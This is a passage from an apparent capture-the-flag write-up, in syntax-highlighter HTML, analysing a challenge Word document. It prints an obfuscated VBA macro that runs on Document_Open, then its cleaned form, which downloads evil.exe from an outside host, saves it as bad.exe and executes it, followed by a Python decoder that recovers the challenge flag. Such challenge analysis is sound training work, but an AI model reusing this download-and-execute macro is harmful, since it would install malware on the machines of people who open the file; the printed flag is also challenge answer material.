class="crayon-cn">111</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">31</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">40</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">51</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">24</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa6593085884777-22"><span class="crayon-v">UkIWIEtqCF</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">QklkhFEQNB</span><span class="crayon-sy">(</span><span class="crayon-t">Array</span><span class="crayon-sy">(</span><span class="crayon-cn">42</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">115</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">188</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c5aa6593085884777-23"><span class="crayon-e">Dim </span><span class="crayon-v">xHttp</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">Set </span><span class="crayon-v">xHttp</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">CreateObject</span><span class="crayon-sy">(</span><span class="crayon-e">QklkhFEQNB</span><span class="crayon-sy">(</span><span class="crayon-t">Array</span><span class="crayon-sy">(</span><span class="crayon-cn">116</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">7</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">6</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">74</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">60</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">43</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">42</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">36</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">64</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">70</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">110</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">27</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">28</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">12</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">12</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">17</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">23</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa6593085884777-24"><span class="crayon-e">Dim </span><span class="crayon-v">bStrm</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">Set </span><span class="crayon-v">bStrm</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">CreateObject</span><span class="crayon-sy">(</span><span class="crayon-e">QklkhFEQNB</span><span class="crayon-sy">(</span><span class="crayon-t">Array</span><span class="crayon-sy">(</span><span class="crayon-cn">15</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">32</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">32</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">53</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">35</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">89</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">22</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">25</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">65</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">53</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">51</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">26</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">176</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c5aa6593085884777-25"><span class="crayon-v">xHttp</span><span class="crayon-sy">.</span><span class="crayon-e">Open </span><span class="crayon-v">UkIWIEtqCF</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">twOvwCSTPL</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">False</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa6593085884777-26"><span class="crayon-v">xHttp</span><span class="crayon-sy">.</span><span class="crayon-e">Send</span></div><div class="crayon-line" id="crayon-5f694c5aa6593085884777-27"><span class="crayon-e">With </span><span class="crayon-i">bStrm</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa6593085884777-28"><span class="crayon-sy">.</span><span class="crayon-v">Type</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line" id="crayon-5f694c5aa6593085884777-29"><span class="crayon-sy">.</span><span class="crayon-i">Open</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa6593085884777-30"><span class="crayon-sy">.</span><span class="crayon-e">write </span><span class="crayon-v">xHttp</span><span class="crayon-sy">.</span><span class="crayon-i">responseBody</span></div><div class="crayon-line" id="crayon-5f694c5aa6593085884777-31"><span class="crayon-sy">.</span><span class="crayon-e">savetofile </span><span class="crayon-e">QklkhFEQNB</span><span class="crayon-sy">(</span><span class="crayon-t">Array</span><span class="crayon-sy">(</span><span class="crayon-cn">20</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">39</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">81</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">118</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">52</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">78</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">11</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">17</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">2</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa6593085884777-32"><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-e">With</span></div><div class="crayon-line" id="crayon-5f694c5aa6593085884777-33"><span class="crayon-e">Shell</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">QklkhFEQNB</span><span class="crayon-sy">(</span><span class="crayon-t">Array</span><span class="crayon-sy">(</span><span class="crayon-cn">20</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">39</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">81</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">118</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">52</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">78</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">11</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">17</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa6593085884777-34"><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-t">Function</span></div><div class="crayon-line" id="crayon-5f694c5aa6593085884777-35"><span class="crayon-m">Private</span><span class="crayon-h"> </span><span class="crayon-e">Sub </span><span class="crayon-e">Document_Open</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa6593085884777-36"><span class="crayon-st">If</span><span class="crayon-h"> </span><span class="crayon-v">ActiveDocument</span><span class="crayon-sy">.</span><span class="crayon-e">Variables</span><span class="crayon-sy">(</span><span class="crayon-s">"ppKzr"</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-v">Value</span><span class="crayon-h"> </span><span class="crayon-o">&lt;&gt;</span><span class="crayon-h"> </span><span class="crayon-s">"toto"</span><span class="crayon-h"> </span><span class="crayon-st">Then</span></div><div class="crayon-line" id="crayon-5f694c5aa6593085884777-37"><span class="crayon-e">BkAIuNwQNDkohBY</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa6593085884777-38"><span class="crayon-v">ActiveDocument</span><span class="crayon-sy">.</span><span class="crayon-e">Variables</span><span class="crayon-sy">(</span><span class="crayon-s">"ppKzr"</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-v">Value</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"toto"</span></div><div class="crayon-line" id="crayon-5f694c5aa6593085884777-39"><span class="crayon-st">If</span><span class="crayon-h"> </span><span class="crayon-v">ActiveDocument</span><span class="crayon-sy">.</span><span class="crayon-v">ReadOnly</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">False</span><span class="crayon-h"> </span><span class="crayon-st">Then</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa6593085884777-40"><span class="crayon-v">ActiveDocument</span><span class="crayon-sy">.</span><span class="crayon-e">Save</span></div><div class="crayon-line" id="crayon-5f694c5aa6593085884777-41"><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-st">If</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa6593085884777-42"><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-st">If</span></div><div class="crayon-line" id="crayon-5f694c5aa6593085884777-43"><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-v">Sub</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0050 seconds] -->
<p>As we can see, this code has its strings encoded and is obfuscated, and when we clean it up, it’s pretty simple:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c5aa659b970726743" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
Public Function Beacon()
x = "http://10.1.33.7/b64/x58/MDgxOTE2MjMwZTMxMDIzMTNhNjk2YjA3NjgzNjM0MjE2YTJjMzA2ODJiNmIwNzBmMzA2ODA3MTMz\nNjY4MmYwNzJmMzA2YjJhNmI2YTM0Njg2ODMzMjU=/evil.exe"
y = "GET"
Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open y, x, False
xHttp.Send
With bStrm
    .Type = 1
        .Open
            .write xHttp.responseBody
                .savetofile "bad.exe", 2
                End With
                Shell ("bad.exe")
                End Function</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c5aa659b970726743-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa659b970726743-2">2</div><div class="crayon-num" data-line="crayon-5f694c5aa659b970726743-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa659b970726743-4">4</div><div class="crayon-num" data-line="crayon-5f694c5aa659b970726743-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa659b970726743-6">6</div><div class="crayon-num" data-line="crayon-5f694c5aa659b970726743-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa659b970726743-8">8</div><div class="crayon-num" data-line="crayon-5f694c5aa659b970726743-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa659b970726743-10">10</div><div class="crayon-num" data-line="crayon-5f694c5aa659b970726743-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa659b970726743-12">12</div><div class="crayon-num" data-line="crayon-5f694c5aa659b970726743-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa659b970726743-14">14</div><div class="crayon-num" data-line="crayon-5f694c5aa659b970726743-15">15</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c5aa659b970726743-1"><span class="crayon-m">Public</span><span class="crayon-h"> </span><span class="crayon-t">Function</span><span class="crayon-h"> </span><span class="crayon-e">Beacon</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa659b970726743-2"><span class="crayon-v">x</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"http://10.1.33.7/b64/x58/MDgxOTE2MjMwZTMxMDIzMTNhNjk2YjA3NjgzNjM0MjE2YTJjMzA2ODJiNmIwNzBmMzA2ODA3MTMz\nNjY4MmYwNzJmMzA2YjJhNmI2YTM0Njg2ODMzMjU=/evil.exe"</span></div><div class="crayon-line" id="crayon-5f694c5aa659b970726743-3"><span class="crayon-v">y</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"GET"</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa659b970726743-4"><span class="crayon-e">Dim </span><span class="crayon-v">xHttp</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">Set </span><span class="crayon-v">xHttp</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">CreateObject</span><span class="crayon-sy">(</span><span class="crayon-s">"Microsoft.XMLHTTP"</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c5aa659b970726743-5"><span class="crayon-e">Dim </span><span class="crayon-v">bStrm</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">Set </span><span class="crayon-v">bStrm</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">CreateObject</span><span class="crayon-sy">(</span><span class="crayon-s">"Adodb.Stream"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa659b970726743-6"><span class="crayon-v">xHttp</span><span class="crayon-sy">.</span><span class="crayon-i">Open</span><span class="crayon-h"> </span><span class="crayon-v">y</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">x</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">False</span></div><div class="crayon-line" id="crayon-5f694c5aa659b970726743-7"><span class="crayon-v">xHttp</span><span class="crayon-sy">.</span><span class="crayon-e">Send</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa659b970726743-8"><span class="crayon-e">With </span><span class="crayon-i">bStrm</span></div><div class="crayon-line" id="crayon-5f694c5aa659b970726743-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">.</span><span class="crayon-v">Type</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa659b970726743-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">.</span><span class="crayon-i">Open</span></div><div class="crayon-line" id="crayon-5f694c5aa659b970726743-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">.</span><span class="crayon-e">write </span><span class="crayon-v">xHttp</span><span class="crayon-sy">.</span><span class="crayon-i">responseBody</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa659b970726743-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">.</span><span class="crayon-i">savetofile</span><span class="crayon-h"> </span><span class="crayon-s">"bad.exe"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">2</span></div><div class="crayon-line" id="crayon-5f694c5aa659b970726743-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-e">With</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa659b970726743-14"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">Shell</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">"bad.exe"</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c5aa659b970726743-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-t">Function</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0007 seconds] -->
<p>Now we can see this matches what we saw in FakeNet. It looks like the URL that it’s looking up is in base64. If we decode it, we get:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c5aa659d217677872" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&gt;&gt;&gt; base64.b64decode("MDgxOTE2MjMwZTMxMDIzMTNhNjk2YjA3NjgzNjM0MjE2YTJjMzA2ODJiNmIwNzBmMzA2ODA3MTMz\nNjY4MmYwNzJmMzA2YjJhNmI2YTM0Njg2ODMzMjU=")
'081916230e3102313a696b07683634216a2c30682b6b070f3068071336682f072f306b2a6b6a3468683325'</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c5aa659d217677872-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa659d217677872-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c5aa659d217677872-1"><span class="crayon-o">&gt;&gt;&gt;</span><span class="crayon-h"> </span><span class="crayon-v">base64</span><span class="crayon-sy">.</span><span class="crayon-e">b64decode</span><span class="crayon-sy">(</span><span class="crayon-s">"MDgxOTE2MjMwZTMxMDIzMTNhNjk2YjA3NjgzNjM0MjE2YTJjMzA2ODJiNmIwNzBmMzA2ODA3MTMz\nNjY4MmYwNzJmMzA2YjJhNmI2YTM0Njg2ODMzMjU="</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa659d217677872-2"><span class="crayon-s">'081916230e3102313a696b07683634216a2c30682b6b070f3068071336682f072f306b2a6b6a3468683325'</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>This looks like an ascii hex string, but if we convert it to bytes, we don’t get anything interesting. However, the URI also includes another single byte (we assume since it starts with x) of x58. If we try decoding the hex string with that byte, we get the key. Here is an example Python script to print the key from the URI.</p>
<p>&nbsp;</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c5aa659f793056944" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
a = “”
s = "MDgxOTE2MjMwZTMxMDIzMTNhNjk2YjA3NjgzNjM0MjE2YTJjMzA2ODJiNmIwNzBmMzA2ODA3MTMz\nNjY4MmYwNzJmMzA2YjJhNmI2YTM0Njg2ODMzMjU=".decode('base64')
for i, x in zip(s[0::2], s[1::2]):
          a+=chr(int(str(i+x), 16)^0x58)
print a

PAN{ViZib13_0nly2th0s3_Wh0_Kn0w_wh3r32l00k}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c5aa659f793056944-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa659f793056944-2">2</div><div class="crayon-num" data-line="crayon-5f694c5aa659f793056944-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa659f793056944-4">4</div><div class="crayon-num" data-line="crayon-5f694c5aa659f793056944-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa659f793056944-6">6</div><div class="crayon-num" data-line="crayon-5f694c5aa659f793056944-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c5aa659f793056944-1"><span class="crayon-v">a</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span>“”</div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa659f793056944-2"><span class="crayon-v">s</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"MDgxOTE2MjMwZTMxMDIzMTNhNjk2YjA3NjgzNjM0MjE2YTJjMzA2ODJiNmIwNzBmMzA2ODA3MTMz\nNjY4MmYwNzJmMzA2YjJhNmI2YTM0Njg2ODMzMjU="</span><span class="crayon-sy">.</span><span class="crayon-e">decode</span><span class="crayon-sy">(</span><span class="crayon-s">'base64'</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c5aa659f793056944-3"><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-v">i</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">x</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">zip</span><span class="crayon-sy">(</span><span class="crayon-v">s</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-o">::</span><span class="crayon-cn">2</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">s</span><span class="crayon-sy">[</span><span class="crayon-cn">1</span><span class="crayon-o">::</span><span class="crayon-cn">2</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa659f793056944-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">a</span><span class="crayon-o">+=</span><span class="crayon-e">chr</span><span class="crayon-sy">(</span><span class="crayon-t">int</span><span class="crayon-sy">(</span><span class="crayon-e">str</span><span class="crayon-sy">(</span><span class="crayon-v">i</span><span class="crayon-o">+</span><span class="crayon-v">x</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">16</span><span class="crayon-sy">)</span><span class="crayon-o">^</span><span class="crayon-cn">0x58</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c5aa659f793056944-5"><span class="crayon-e">print</span><span class="crayon-h"> </span><span class="crayon-e">a</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa659f793056944-6">&nbsp;</div><div class="crayon-line" id="crayon-5f694c5aa659f793056944-7"><span class="crayon-e">PAN</span><span class="crayon-sy">{</span><span class="crayon-v">ViZib13_0nly2th0s3_Wh0_Kn0w_wh3r32l00k</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p></p>
<h3>Document 2 Challenge: Can you crack doc?</h3>
<p><em>Challenge Created By: Tyler Halfpop </em><a href="https://twitter.com/0xtyh" target="_blank"><em>@0xtyh</em></a></p>
<p>For this challenge, we’re provided a file named “CrackDoc.doc” and when we open it, we’re presented with a ‘UsersForm1’ prompt for ‘Key’ value.</p>
